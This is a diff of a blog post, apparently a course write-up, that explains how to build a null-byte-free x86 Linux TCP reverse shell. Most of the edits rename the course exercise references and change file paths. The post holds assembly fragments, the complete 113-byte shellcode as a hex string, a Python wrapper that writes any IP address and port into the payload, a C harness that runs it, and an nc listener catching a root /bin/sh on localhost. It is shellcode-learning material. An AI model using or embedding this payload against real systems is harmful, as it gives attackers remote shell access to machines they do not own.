@@ -1,16 +1,16 @@
 ---
 layout: post
-title: "SLAE32 - 2. TCP Reverse Shell"
+title: "x86 TCP Reverse Shell"
 ---
 
 ## Introduction
-The second exercise for the slae32 course is to write a TCP reverse shell using x86. During this exercise, I noticed that a high percentage of code could be taken directly from the TCP bind shell, completed in exercise 1. However I chose to implement this from scratch without copy and pasting in order to confirm my newly learnt instructions and confirm I remembered the previous exercise and the steps taken to complete it.
+After writing bind shell, I wanted to learnt how to create a TCP reverse shell using x86. I noticed that a high percentage of code could be taken directly from the TCP bind shell. However I chose to implement this from scratch without copy and pasting in order to confirm my newly learnt instructions and confirm I remembered the previous task of creating a bind shell and the steps taken to complete it.
 
 ## Brief Thoughts
-During this exercise I performed similar steps to exercise 1, so to prevent a high amount of repetition within this post I will walk through the code once again however I will only explain specific sections of code that were not discussed during the completion of the TCP bind shell, making sure to cover any new C, system calls, wrapper changes and x86. Overall, I found implementing the reverse shell to be easier than the bind shell - but this may be because I had already written my first file in x86 so now this felt a little easier to work through. I had a little trouble making sure the python wrapper stomped out any NULL bytes, however that will be discussed later on in the post.
+During this task I performed similar steps to the bind shell, so to prevent a high amount of repetition within this post I will walk through the code once again however I will only explain specific sections of code that were not discussed during the completion of the TCP bind shell, making sure to cover any new C, system calls, wrapper changes and x86. Overall, I found implementing the reverse shell to be easier than the bind shell - but this may be because I had already written my first file in x86 so now this felt a little easier to work through. I had a little trouble making sure the python wrapper stomped out any NULL bytes, however that will be discussed later on in the post.
 
 ## Initial Planning
-Similar to exercise 1, my first steps are to gather the information required to create my reverse shell - making sure I have all the required system call information and any additional documentation required to duplicate a C based reverse shell. The following C code presents the TCP reverse shell solution that I used as my reference during this exercise:
+Similar to the bind shell, my first steps are to gather the information required to create my reverse shell - making sure I have all the required system call information and any additional documentation required to duplicate a C based reverse shell. The following C code presents the TCP reverse shell solution that I used as my reference:
 
 ```
 #include <stdio.h>
@@ -47,15 +47,15 @@ int main(int argc, char *argv[])
 }
 ```
 
-Compared to exercise 1, the only new system call we can see here is the connect() function. Before we start, let’s make sure we have all the required information using the same approach as last time:
+Compared to the bind shell, the only new system call we can see here is the connect() function. Before we start, let’s make sure we have all the required information using the same approach as last time:
 
 ```
-root@kali:~/Documents/slae32/exercise_2# cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep connect
+root@kali:~/Documents/revshell# cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep connect
 #define __NR_connect 362
 ```
 
 ```
-root@kali:~/Documents/slae32/exercise_2# man 2 connect
+root@kali:~/Documents/revshell# man 2 connect
 <snipped>
 SYNOPSIS
        #include <sys/types.h>          /* See NOTES */
@@ -69,7 +69,7 @@ RETURN VALUE
        is returned, and errno is set appropriately.
 ```
 
-We can now create our table of system calls required for this exercise:
+We can now create our table of system calls required for the reverse shell:
 
 | System Call | C Definition | Return Value | Syscall Number |
 |---|:---|:---|:---|
@@ -80,7 +80,7 @@ We can now create our table of system calls required for this exercise:
 {:.mbtablestyle}
 
 ## Crafting our Reverse Shellcode
-Similar to exercise 1, we first want to create the skeleton of our script. Making sure we have our entry point and clean registers:
+Similar to our bind shell, we first want to create the skeleton of our script. Making sure we have our entry point and clean registers:
 
 ```
 global    _start
@@ -112,7 +112,7 @@ The second system call required is new to us, and required a bit of work to get 
 * a pointer to a sockaddr struct
 * the size of this sockaddr struct in memory
 
-As previously researched in exercise 1, the sockaddr struct contains the following data (taken from https://www.cs.cmu.edu/~srini/15-441/S10/lectures/r01-sockets.pdf):
+As previously researched, the sockaddr struct contains the following data (taken from https://www.cs.cmu.edu/~srini/15-441/S10/lectures/r01-sockets.pdf):
 
 ```
 struct sockaddr_in {
@@ -171,7 +171,7 @@ int 0x80
 
 To quickly cover the above snippet, we start off by XOR-ing our EAX register before placing the syscall value 362 (0x16a) into the lower half of the register. Remember, we use AX instead of EAX to remove any NULL bytes in the final payload. We place the value returned by our socket() system call in our 1st parameter (EBX) before crafting our sockaddr struct. Once created and placed on the stack, as described before, we move the current value of our ESP register (pointer to the top of the stack) into our second parameter (ECX). This now satisfies the pointer requirement, described in our initial analysis of the connect system call. Finally, we xor our 3rd parameter register (EDX) and move the value 16 into the lower half of the register, stating the size of the struct. The system call is now ready to execute with the ‘int 0x80’ instruction.
 
-We now need to call dup2() three times to set up our pipes for our final shell. Originally, in exercise 1, I implemented three separate chunks of instructions to perform the system call with the correct parameter values. In my second draft I changed this to use a loop, decrementing the counter each time before breaking out of the loop. This time around I returned to the three separate chunks of instructions. The main reason was, I forgot how to implement a loop and I didn’t want to look back at my previous asm file for help. So I stuck with the three chunks:
+We now need to call dup2() three times to set up our pipes for our final shell. Originally, in the implementation of the bind shell, I implemented three separate chunks of instructions to perform the system call with the correct parameter values. In my second draft I changed this to use a loop, decrementing the counter each time before breaking out of the loop. This time around I returned to the three separate chunks of instructions. The main reason was, I forgot how to implement a loop and I didn’t want to look back at my previous asm file for help. So I stuck with the three chunks:
 
 ```
 ; syscall dup2 - 3 times 63 (0x3f)
@@ -195,9 +195,9 @@ mov cl, 0x2
 int 0x80                ; third call with 2
 ```
 
-I won’t explain this code again, as it is exactly the same as exercise 1. If you are unsure of the implementation above, please check that post.
+I won’t explain this code again, as it is exactly the same as the bind shell. If you are unsure of the implementation above, please check that post.
 
-By this point, our asm script sets up a socket, attempts to connect to a remote host and sets up our pipes ready for our new target process, in this case, it’s our “/bin/sh” shell. This means the final system call required is our execve() call. Again, this implementation came out the same as exercise 1, so again, I won’t step through it.
+By this point, our asm script sets up a socket, attempts to connect to a remote host and sets up our pipes ready for our new target process, in this case, it’s our “/bin/sh” shell. This means the final system call required is our execve() call. Again, this implementation came out the same as our bind shell, so again, I won’t step through it.
 
 ```
 ; syscall execve 11 (0xb)
@@ -304,7 +304,7 @@ _start:
 Now the reverse shell script is complete, we want to make sure we can assemble and link it without any errors. This is done with the following:
 
 ```
-root@kali:~/Documents/slae32/exercise_2# ../misc/build.sh first_reverse_shell
+root@kali:~/Documents/revshell# ../misc/build.sh first_reverse_shell
 Assembling first_reverse_shell.asm
 Linking first_reverse_shell.o
 Done
@@ -315,12 +315,12 @@ At this point, I tested and confirmed that the reverse shell worked before movin
 We can then dump the hex from the assembled object, and check we don’t have any NULL bytes within the output. The contents of dump_hex.sh can be seen in the first post:
 
 ```
-root@kali:~/Documents/slae32/exercise_2# ../misc/dump_hex.sh first_reverse_shell
+root@kali:~/Documents/revshell# ../misc/dump_hex.sh first_reverse_shell
 "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x89\\xfb\\x31\\xc9\\x51\\xc6\\x04\\x24\\x7f\\xc6\\x44\\x24\\x03\\x01\\x51\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xb1\\x01\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xb1\\x02\\xcd\\x80\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\x31\\xc0\\xb0\\x0b\\xcd\\x80"
 ```
 
 ## Wrapper to allow custom IP address and Port number:
-Similar to the python wrapper used in exercise 1, this wrapper allows the user to specify their own port number. This number is then converted into hex values and placed within the correct position of our shellcode string. As well as the custom port number, I added functionality for custom IP addresses to be placed into the shellcode itself. I achieved this by taking the required instructions and their op codes from the 'objdump -d’ output and created four separate chunks of these instructions.
+Similar to the python wrapper used with our bind shell, this wrapper allows the user to specify their own port number. This number is then converted into hex values and placed within the correct position of our shellcode string. As well as the custom port number, I added functionality for custom IP addresses to be placed into the shellcode itself. I achieved this by taking the required instructions and their op codes from the 'objdump -d’ output and created four separate chunks of these instructions.
 
 ```
 fourth_ip_asm = "\\xc6\\x04\\x24\\x[4]"       # movb   $0x7f,(%esp)   (127)
@@ -334,7 +334,7 @@ As we can see, each string contains a tag with an integer in there, i.e [1], [2]
 The complete python wrapper with tags that are replaced by user input can be seen below:
 
 ```
-root@kali:~/Documents/slae32/exercise_2# cat wrapper.py 
+root@kali:~/Documents/revshell# cat wrapper.py 
 import sys
 import socket
 
@@ -427,7 +427,7 @@ print shellcode
 Using our wrapper:
 
 ```
-root@kali:~/Documents/slae32/exercise_2# python wrapper.py 127.0.0.1 9005
+root@kali:~/Documents/revshell# python wrapper.py 127.0.0.1 9005
 Chosen ip: 127.0.0.1
 Chosen port: 9005
 \xc6\x44\x24\x03\x7f
@@ -559,7 +559,7 @@ print shellcode
 Running our Python wrapper once again produces NULL byte free shellcode that can be placed directly into our C script, allowing us to compile and inject the new payload:
 
 ```
-root@kali:~/Documents/slae32/exercise_2# cat shell.c
+root@kali:~/Documents/revshell# cat shell.c
 #include<stdio.h>
 #include<string.h>
 
@@ -575,32 +575,29 @@ int main(void)  {
 We can finally compile our C program with the required arguments:
 
 ```
-root@kali:~/Documents/slae32/exercise_2# gcc -fno-stack-protector -z execstack shell.c -o shell
+root@kali:~/Documents/revshell# gcc -fno-stack-protector -z execstack shell.c -o shell
 ```
 
 We are now ready to try out our reverse shell. First we set up a listener on the specified port:
 
 ```
-root@kali:~/Documents/slae32/exercise_2# nc -nlvp 9005
+root@kali:~/Documents/revshell# nc -nlvp 9005
 listening on [any] 9005 ...
 ```
 
 We then execute our newly compiled shell:
 
 ```
-root@kali:~/Documents/slae32/exercise_2# ./shell 
+root@kali:~/Documents/revshell# ./shell 
 Shellcode Length:  113
 ```
 
 Looking back at our listener, we notice we have the successfully caught our reverse shell and have dropped into an interactive “/bin/sh” process:
 
 ```
-root@kali:~/Documents/slae32/exercise_2# nc -nlvp 9005
+root@kali:~/Documents/revshell# nc -nlvp 9005
 listening on [any] 9005 ...
 connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 40884
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
-
-## Additional:
-todo - amend this section to include any course details ready for submission. For now, the write ups will just be live.
